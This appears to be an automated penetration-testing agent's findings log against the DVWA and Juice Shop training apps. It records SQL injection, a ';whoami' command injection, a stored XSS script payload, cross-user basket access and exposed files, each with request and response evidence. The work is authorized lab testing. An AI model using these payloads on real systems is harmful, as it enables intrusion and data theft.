state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

endpoints.observation_evidence: Form action=http://dvwa/vulnerabilities/sqli/ method=GET; fields: id (text, no maxlength), Submit (submit, value 'Submit'). Page shows 'User ID:' lookup, SQLi DB mysql.
Form action=http://dvwa/vulnerabilities/exec/ method=POST; fields: ip (text, no maxlength), Submit (submit, value 'Submit'). 'Ping a device' page.

Form action=http://dvwa/vulnerabilities/xss_s/ method=POST; fields: txtName (text, maxlength 10), mtxMessage (textarea, maxlength 50), btnSign (submit 'Sign Guestbook'), btnClear (submit 'Clear Guestbook'). Existing entry: name 'test'. Note: 50-char canary exceeds txtName limit; message field is the 50-char limit.

acct1 GET /rest/basket/6 -> 200, UserId 22, Products: Apple Juice (1000ml) qty 3. Also GET /rest/basket/1 under acct1 -> 200 returned UserId 1 basket (Apple Juice qty 2, Orange Juice qty 3, Eggfruit Juice qty 1), indicating no ownership check. acct2 own basket = 7.

Directory listing with Accept: text/html,application/json returns 200 listing: quarantine, acquisitions.md (909 B), announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package.json.bak, suspicious_errors.yml.
Linked from /ftp/ listing (909 bytes). Not yet retrieved; retrieval reserved for verification agent.
GET /rest/products/search?q=apple -> 200 JSON list of products (Apple Juice, Apple Pomace). Search parameter q is a likely SQLi surface (not tested).
GET /api/Products/ unauth -> 200 JSON list of products with id, name, description, price, deluxePrice.
GET /api/Feedbacks/ unauth -> 200 JSON list of 8 feedback entries with UserId, comment, rating.

findings.title: SQL Injection in User ID lookup (id parameter) at /vulnerabilities/sqli/
findings.response_evidence: TRUE (id=1' OR '1'='1): HTTP 200, 5 records: 'First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE (id=1' AND '1'='2): HTTP 200, zero records ('User ID:' followed directly by 'More Information'; no 'ID:' / 'First name:' / 'Surname:' entries).

findings.title: OS Command Injection via ip parameter at /vulnerabilities/exec/
request_sequence: POST http://dvwa/vulnerabilities/exec/ form ip='127.0.0.1; whoami', Submit='Submit' (session dvwa_admin, Low)
findings.response_evidence: HTTP 200. Ping output for 127.0.0.1 (4 packets, 0% loss) followed by a standalone line 'www-data' immediately before 'More Information'. The 'www-data' line is the output of the injected whoami command, identifying the web-process user.

findings.title: Stored XSS in guestbook message (mtxMessage) at /vulnerabilities/xss_s/
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ form txtName='xss' (10 char limit respected), mtxMessage='<script id="test_token">window.xss_flag=1</script>' (50 chars), btnSign='Sign Guestbook' (session dvwa_admin, Low)
findings.response_evidence: POST returned HTTP 200 and the guestbook persisted the entry (Name: xss). Canary is 50 characters, matching the mtxMessage maxlength. Rendering page loaded in dvwa_admin browser session (HTTP 200). Note: the text-only DOM summary omits the script body, so the stored payload was not visible as text; execution was determined by the JS check below.

findings.title: Cross-user basket access (BOLA) on GET /rest/basket/{id}
findings.response_evidence: acct1 own basket 6: {"status":"success","data":{"id":6,"UserId":22,"Products":[{"name":"Apple Juice (1000ml)","BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3}}]}}. acct2 (own_basket_id=7) requesting /rest/basket/6 received the identical body: id 6, UserId 22, Apple Juice (1000ml) quantity 3. acct2 is not the owner (its own basket is 7), so acct1's basket contents were disclosed cross-user.

findings.title: Open directory listing at /ftp/ exposes confidential acquisitions.md
findings.response_evidence: Listing (unauth, 200 text/html): 'listing directory /ftp/ ... acquisitions.md 909 ... announcement_encrypted.md ... coupons_2013.md.bak ... incident-support.kdbx ... legal.md ...' — the document is listed and linked. Only the listing itself is the exposure vector; no authentication required.

findings.title: Confidential acquisition memo publicly retrievable at /ftp/acquisitions.md
request_sequence: GET http://juiceshop:3000/ftp/ with Accept: text/html,application/json (session=unauth) -> 200 (listing shows acquisitions.md 909 B)
findings.response_evidence: HTTP 200, content-type text/markdown: "# Planned Acquisitions / > This document is confidential! Do not distribute! / Our company plans to acquire several competitors within the next year. This will have a significant stock market impact as we will elaborate in detail in the following paragraph: ..." Unauthenticated retrieval of a confidential acquisition memo.

findings.title: SQL Injection in product search parameter q (boolean-based differential)
findings.response_evidence: TRUE (q=' OR '1'='1) -> HTTP 200 {"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)",...},{"id":24,"name":"Apple Pomace",...},{"id":6,"name":"Banana Juice (1000ml)",...},{"id":42,"name":"Best Juice Shop Salesman Artwork",...},{"id":30,"name":"Carrot Juice (1000ml)",...},{"id":3,"name":"Eggfruit Juice (500ml)",...},{"id":25,"name":"Fruit Press",...},{"id":22,"name":"Green Smoothie",...},{"id":41,"name":"Juice Shop \"Permafrost\" 2020 Edition",...} ... (multiple records; body truncated in excerpt). FALSE (q=' AND '1'='2) -> HTTP 200 {"status":"success","data":[]} (zero records). Differential: TRUE returns the full product catalog while FALSE returns empty, showing the boolean condition is evaluated in the SQL query.

findings.title: Unauthenticated disclosure of all user feedback records including other users' UserIds and partially masked emails
findings.response_evidence: HTTP 200 unauthenticated, {"status":"success","data":[...]} with 8 feedback records (ids 1-8). Fields returned: UserId, id, comment, rating, createdAt, updatedAt. Sample: {"UserId":1,"id":1,"comment":"I love this shop! ... (***in@juice-sh.op)","rating":5}; {"UserId":21,"id":4,"comment":"Please send me the juicy chatbot NFT in my wallet at /juicy-nft : \"purpose betray marriage blame crunch monitor spin slide donate sport lift clutch\" (***ereum@juice-sh.op)","rating":1}; {"UserId":null,"id":5,...,"(anonymous)"}. Records 1-4 are attributed to other registered users (UserId 1, 2, 3, 21) with user email fragments in comments, and are returned without any authentication. Count: 8.

findings.title: Product listing exposes only public catalog fields (no unauthorized disclosure demonstrated)
findings.response_evidence: HTTP 200 {"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"deluxePrice":0.99,"image":"apple_juice.jpg","createdAt":"2026-11-05T13:34:09.212Z","updatedAt":"2026-11-05T13:34:09.212Z","deletedAt":null},{"id":2,"name":"Orange Juice (1000ml)",...},...]. Fields are the public product catalog attributes (id, name, description, price, deluxePrice, image, createdAt, updatedAt, deletedAt). No credentials, user data, or internal-only fields observed in the returned portion. deletedAt was null in all visible records; the body excerpt was truncated, so no soft-deleted records were confirmed either. Criterion for confirmation not met.
